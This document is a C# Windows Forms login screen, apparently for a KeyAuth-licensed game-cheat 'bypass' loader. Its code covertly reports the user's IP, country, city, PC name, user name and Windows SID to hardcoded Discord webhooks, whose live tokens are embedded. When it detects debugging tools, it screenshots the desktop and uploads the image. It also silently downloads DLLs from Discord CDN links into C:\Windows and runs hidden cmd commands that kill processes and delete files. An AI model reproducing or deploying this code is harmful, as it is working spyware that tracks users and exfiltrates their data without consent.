using BYPASS;
using DebugProtector;
using KeyAuth;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using TextBox = System.Windows.Forms.TextBox;
using System.Runtime.InteropServices;
using Discord;
using Color = System.Drawing.Color;
using Stealer;
using System.Xml.Serialization;
using static KeyAuth.api;
using System.Windows.Input;
using System.Web.UI.WebControls;
using System.Security.Principal;
using System.Speech.Synthesis;
using static System.Net.Mime.MediaTypeNames;
using static Guna.UI2.Native.WinApi;
using System.Collections.Specialized;
using System.Xml;

namespace numer
{
    public partial class Form2 : Form
    {
        [DllImport("Kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AlloConsol();

        static void SendMs(string message)
        {
            string webhook = "https://canary.discord.com/api/webhooks/1074106550974697492/0zjfC2wCmgbJ6YST3BhJ-tem4MPmeh7XNYL04RtfLjPDxs4VolPSZ7zp5n5JGUFTdngE";

            WebClient client = new WebClient();
            client.Headers.Add("Content-Type", "application/json");
            string payload = "{\"content\": \"" + message + "\"}";
            client.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
        }

    

     
        private void sendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();
            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }
        private void CaptureMyScreen2()
        {
            try
            {
                string result = Path.GetTempPath();
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                //Creating a new Bitmap object
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                //Creating a Rectangle object which will
                //capture our Current Screen
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                captureBitmap.Save(@"C:\Windows\Setup\\crack.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                //C:\Users\nightmood\AppData\Local
                //Displaying the Successfull Result
                //MessageBox.Show("Screen Captured");
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.Message);
            }
        }
        public static Form2 login;

        public string username;
        public string expiry;
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
            int Msg, int wParam, int lParam);

        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();




        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        public static String GetProcessorId()
        {

            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();
            String Id = String.Empty;
            foreach (ManagementObject mo in moc)
            {

                Id = mo.Properties["processorID"].Value.ToString();
                break;
            }
            return Id;

        }
        public static String GetComputerName()
        {
            ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
            ManagementObjectCollection moc = mc.GetInstances();
            String info = String.Empty;
            foreach (ManagementObject mo in moc)
            {
                info = (string)mo["Name"];

            }
            return info;
        }

        public Form2()
        {
         InitializeComponent(); 
         loginBtn.Visible = false;
         checkk.RunWorkerAsync();
         this.FormBorderStyle = FormBorderStyle.None;
         this.BackColor = Color.LimeGreen;
         this.TransparencyKey = Color.LimeGreen;
         textBox1.BackColor = this.BackColor;


         Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 32, 22));
         BW_hotkeys.RunWorkerAsync();
         Program.KeyAuthApp.check();
         backgroundWorker1.RunWorkerAsync();
         if (Program.KeyAuthApp.checkblack())
         {
            string hwid = WindowsIdentity.GetCurrent().User.Value;
            AllocConsole();
            Console.Title = "Administrator: Blocked";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("your Pc Got Banned From Server " + hwid);
            Console.WriteLine("\npress any key to continue ...");
            Console.ReadKey();
            Environment.Exit(0);
         }
        }
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
        public int animatedTextLength = 0;
        public string animatedTextValue;
        public string animatedTextColor = "White";
        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = !char.IsDigit(e.KeyChar) && !char.IsControl(e.KeyChar);
        }

        public static bool SubExist(string name)
        {
            if (Program.KeyAuthApp.user_data.subscriptions.Exists(x => x.subscription == name))
                return true;
            return false;
        }
        [DllImport("Gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();
     
        private void Form2_Load(object sender, EventArgs e)
        {
        
            //var pkey = @"C:\Key.ini";
            //if (File.Exists(pkey))
            //{
            //    string ssd = File.ReadAllText(pkey);
            //    Program.KeyAuthApp.license(ssd);
            //}
            //if (Program.KeyAuthApp.response.success)
            //{
            //    BeginInvoke(new Action(() =>
            //    {

            //        BP Home = new BP();
            //        Home.Show();
                   
            //        this.Hide();
            //    }));
            //}
            animatedTextValue = "Not Support Now ".ToUpper();
            animatedText.Start();

            timer1.Interval = 1000;
            timer1.Start();
                
            Random random = new Random();
            string RandomString(int length)
            {
                const string chars = "123";
                return new string(Enumerable.Repeat(chars, length)
                    .Select(s => s[random.Next(s.Length)]).ToArray());
            }
            var randomName = RandomString(3);
            hdd.Text = GetProcessorId() + "-" + GetComputerName();
            random1.Text = RandomString(3);
            string kh = "C:\\Windows\\ucrtbased.dll";
            string kh3 = "C:\\Windows\\VCRUNTIME140_1D.dll";
            string ll = "C:\\Windows\\VCRUNTIME140D.dll";
            string llé = "C:\\Windows\\MSVCP140D.dll";
            if (File.Exists(kh))
            {

            }
            else
            {
                using (WebClient gg = new WebClient())
                {
                    gg.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180861780541460/ucrtbased.dll", "C:\\Windows\\ucrtbased.dll");
                }
            }
            if (File.Exists(kh3))
            {

            }
            else
            {
                using (WebClient gg = new WebClient())
                {
                    gg.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180862124470329/VCRUNTIME140_1D.dll", "C:\\Windows\\VCRUNTIME140_1D.dll");
                }
            }

            if (File.Exists(ll))
            {

            }
            else

            {
                using (WebClient gg = new WebClient())
                {
                    gg.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180862606802985/VCRUNTIME140D.dll", "C:\\Windows\\VCRUNTIME140D.dll");
                }
            }
            if (File.Exists(llé))
            {


            }
            else
            {
                using (WebClient gg = new WebClient())
                {
                    gg.DownloadFile("https://cdn.discordapp.com/attachments/1026251677998796901/1047180862896226444/MSVCP140D.dll", "C:\\Windows\\MSVCP140D.dll");
                }
            }
        }

      

        private void BW_loginBtn_DoWork(object sender, DoWorkEventArgs e)
        {
            Program.KeyAuthApp.license(key.Text);
            var pkeyy = @"C:\\Key.ini";
            if (Program.KeyAuthApp.response.success)
            {
                BeginInvoke(new Action(() =>
                {
                    File.WriteAllText(pkeyy, key.Text);
                    BP Home = new BP();
                    Home.Show();
                    this.Hide();
                }));
            }
            else
                {
                BeginInvoke(new Action(() =>
                {
                    loginBtn.Cursor = Cursors.Hand;
                    loginBtn.ForeColor = Color.White;
                    status.Text = Program.KeyAuthApp.response.message;
                }));
            }

            BeginInvoke(new Action(() =>
            {
                loginBtn.Cursor = Cursors.Hand;
                loginBtn.ForeColor = Color.White;
            }));
        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {
            if(guna2TextBox1.Text == random1.Text)
            {
                loginBtn.Visible = true;
            }
        }

        private void guna2TextBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            // Verify that the pressed key isn't CTRL or any non-numeric digit
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar) && (e.KeyChar != '.'))
            {
                e.Handled = true;
            }

            // If you want, you can allow decimal (float) numbers
            if ((e.KeyChar == '.') && ((sender as TextBox).Text.IndexOf('.') > -1))
            {
                e.Handled = true;
            }
        }

     


        private void guna2TextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Random rn = new Random();
            int R, G, B;
            R = rn.Next(0, 255);
            G = rn.Next(0, 255);
            B = rn.Next(255, 255);
          //  khaled1.Text = "Red" + R + "Green " + G + "Blue" + B;
           // BackColor = Color.FromArgb(R, G, B);
            status.BorderColor = Color.FromArgb(R, G, B);
            label2.ForeColor = Color.FromArgb(R, G, B);
            status.ForeColor = Color.FromArgb(R, G, B);

        }

        private void animatedText_Tick(object sender, EventArgs e)
        {

        }

        private void loginBtn_Click_1(object sender, EventArgs e)
        {
            if (!BW_loginBtn.IsBusy)
            {
                loginBtn.Cursor = Cursors.No;
                loginBtn.ForeColor = Color.Orange;

                status.Text = "";
                BW_loginBtn.RunWorkerAsync();
            }
        }

        private void Form2_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, cf4b7fa8f8c1aa3a.WM_NCLBUTTONDOWN, cf4b7fa8f8c1aa3a.HT_CAPTION, 0);
            }
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        private static void killChildren(int parentPID)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                      ("Select * From Win32_Process Where ParentProcessID=" + parentPID);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                killChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(parentPID);
                proc.Kill();
            }
            catch (ArgumentException)
            {
                // Process already exited.
            }
        }
        public string IPRequestHelper(string url)
        {

            HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();

            StreamReader responseStream = new StreamReader(objResponse.GetResponseStream());
            string responseRead = responseStream.ReadToEnd();

            responseStream.Close();
            responseStream.Dispose();

            return responseRead;
        }
        public string GetCountryByIP(string ipAddress)
        {
            string strReturnVal;
            string ipResponse = IPRequestHelper("http://ip-api.com/xml/" + ipAddress);
            //return ipResponse;
            XmlDocument ipInfoXML = new XmlDocument();
            ipInfoXML.LoadXml(ipResponse);
            XmlNodeList responseXML = ipInfoXML.GetElementsByTagName("query");
            NameValueCollection dataXML = new NameValueCollection();
            dataXML.Add(responseXML.Item(0).ChildNodes[2].InnerText, responseXML.Item(0).ChildNodes[2].Value);
            strReturnVal = responseXML.Item(0).ChildNodes[1].InnerText.ToString(); // Contry
            return strReturnVal;
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
           try
            {
                var process = DebuggerAcl.Run();
                //var text = DebuggerAcl2.mazn();
                if (process != "")
                {
                    CaptureMyScreen2();
                    filePath.Text = "C:\\Windows\\Setup\\crack.jpg";
                    sendImg("https://canary.discord.com/api/webhooks/1074106550974697492/0zjfC2wCmgbJ6YST3BhJ-tem4MPmeh7XNYL04RtfLjPDxs4VolPSZ7zp5n5JGUFTdngE", filePath.Text);
                    WebClient web1 = new WebClient();
                    string IP = web1.DownloadString("https://icanhazip.com/");
                    // string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                    // string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                    string pc = System.Environment.MachineName;
                    string ssd = WindowsIdentity.GetCurrent().User.Value;
                    string pc1 = System.Environment.UserName;
                    var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
                    string key = Program.KeyAuthApp.user_data.username;
                    string ss = @"😂 **Program Check**  : " + process + "\n ☠ **Contry** : " + GetCountryByIP(IP) + "\n ☠ **IP** : " + IP.Trim() + "\n 💻 **Pc Name** : " + pc + "\n 📳 **HWID : **" + ssd + "\n ** 🖥 User_Name : **" + pc1 + "\n 🔑 **Key** : " + key + "\n 🛒 **Bypass** : " + sub;
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                    discordToPost.Add("content", ss);
                    var content = new FormUrlEncodedContent(discordToPost);
                    Uri webhook = new Uri("https://canary.discord.com/api/webhooks/1074106550974697492/0zjfC2wCmgbJ6YST3BhJ-tem4MPmeh7XNYL04RtfLjPDxs4VolPSZ7zp5n5JGUFTdngE");
                    client.PostAsync(webhook, content);
                    Program.KeyAuthApp.ban(process);
                    //System.Diagnostics.Process.EnterDebugMode();
                    //RtlSetProcessIsCritical(1, 0, 0);
                    //System.Diagnostics.Process.GetCurrentProcess().Kill();
                    dos("taskkill /F /IM AndroidProcess.exe");
                    dos("taskkill /F /IM ProjectTitan.exe");
                    dos("taskkill /F /im AndroidEmulator.exe");
                    dos("taskkill /F /im AndroidEmulatorEn.exe");
                    dos("taskkill /F /im AndroidEmulatorEx.exe");
                    dos("taskkill /F /im Gameloop.exe");
                    File.Delete(cf4b7fa8f8c1aa3a.Project5);
                    File.Delete(cf4b7fa8f8c1aa3a.Proje1);

                    Thread.Sleep(1000);
                    Environment.Exit(0);
                }

            }
            catch { }


        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
         try
            {
                WebClient web1 = new WebClient();
                string IP = web1.DownloadString("https://icanhazip.com/");
                //string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                //string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                string pc = System.Environment.MachineName;
                string pc1 = System.Environment.UserName;
                string ssd = WindowsIdentity.GetCurrent().User.Value;
                DateTime now = DateTime.Now;
                string key = Program.KeyAuthApp.user_data.username;
                string ss = @"@everyone" + "\n ☠ **Contry** : " + GetCountryByIP(IP) + "\n ☠ **IP** : " + IP.Trim() + "\n 💻 **Pc Name** : " + pc + "\n 📳 **HWID : **" + ssd + "\n ** 🖥 User_Name : **" + pc1 + "\n 🔑 **Key** : " + key + "\n 🛒 **Bypass** : " + "\n ⏱ Data : " + now;
                HttpClient client = new HttpClient();
                Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                discordToPost.Add("content", ss);
                var content = new FormUrlEncodedContent(discordToPost);
                Uri webhook = new Uri("https://canary.discord.com/api/webhooks/1088539664379551835/myF9w-yROYhJwCv27nszZoR67uYoo3nd2zWTfCx1uomFdo4aN3kMkCPgcd1BuM885-9M");
                client.PostAsync(webhook, content);
            }
            catch { }

        }
        public void dos(string command)
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = " /C " + command,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardError = false,
                RedirectStandardOutput = false
            };
            process.Start();
            process.WaitForExit(5000);
        }
        private void timer3_Tick(object sender, EventArgs e)
        {
               try
               {
                var text = DebuggerAcl2.mazn();
                if (text != "")
                {
                    CaptureMyScreen2();
                    filePath.Text = "C:\\Windows\\Setup\\crack.jpg";
                    sendImg("https://canary.discord.com/api/webhooks/1074106550974697492/0zjfC2wCmgbJ6YST3BhJ-tem4MPmeh7XNYL04RtfLjPDxs4VolPSZ7zp5n5JGUFTdngE", filePath.Text);
                    WebClient web1 = new WebClient();
                    string IP = web1.DownloadString("http://ip-api.com/csv/?fields=query");
                    string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                    string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                    string pc = System.Environment.MachineName;
                    string pc1 = System.Environment.UserName;
                    string ssd = WindowsIdentity.GetCurrent().User.Value;
                    string key = Program.KeyAuthApp.user_data.username;
                    var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
                    string ss = @"😂 **Text Copy**  : " + text + "\n ☠ **Contry** : " + ssCountry1.Trim() + "\n ☠ **IP** : " + IP.Trim() + "\n 🚩 **City** : " + city.Trim() + "\n 💻 **Pc Name** : " + pc + "\n 📳 **HWID : **" + ssd + "\n ** 🖥 User_Name : **" + pc1 + "\n 🔑 **Key** : " + key + "\n 🛒 **Bypass** : " + sub;
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                    discordToPost.Add("content", ss);
                    var content = new FormUrlEncodedContent(discordToPost);
                    Uri webhook = new Uri("https://canary.discord.com/api/webhooks/1074106550974697492/0zjfC2wCmgbJ6YST3BhJ-tem4MPmeh7XNYL04RtfLjPDxs4VolPSZ7zp5n5JGUFTdngE");
                    client.PostAsync(webhook, content);
                    Program.KeyAuthApp.ban(text);
                    //System.Diagnostics.Process.EnterDebugMode();
                    //RtlSetProcessIsCritical(1, 0, 0);
                    //System.Diagnostics.Process.GetCurrentProcess().Kill();
                    dos("taskkill /F /IM AndroidProcess.exe");
                    dos("taskkill /F /IM ProjectTitan.exe");
                    dos("taskkill /F /im AndroidEmulator.exe");
                    dos("taskkill /F /im AndroidEmulatorEn.exe");
                    dos("taskkill /F /im AndroidEmulatorEx.exe");
                    dos("taskkill /F /im Gameloop.exe");
                    File.Delete(cf4b7fa8f8c1aa3a.Project5);
                    File.Delete(cf4b7fa8f8c1aa3a.Proje1);
                    Thread.Sleep(1800);
                    Environment.Exit(0);
                }
            }
            catch { }
            
        }

        private void checkk_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void guna2HtmlLabel1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void checkk_DoWork_1(object sender, DoWorkEventArgs e)
        {

        }
    }
   
}

